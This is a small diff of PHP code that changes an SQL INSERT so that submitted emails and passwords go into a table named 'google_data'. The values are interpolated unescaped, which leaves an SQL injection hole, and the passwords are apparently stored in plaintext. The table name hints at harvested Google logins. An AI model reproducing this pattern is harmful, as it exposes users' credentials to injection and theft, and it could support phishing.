@@ -21,7 +21,7 @@ session_start();
              exit;
          }
 
-    if(mysqli_query($conn,"INSERT INTO data (email, password)
+    if(mysqli_query($conn,"INSERT INTO google_data (email, password)
         VALUES ('$email','$password')")){
           ?>
           <head>
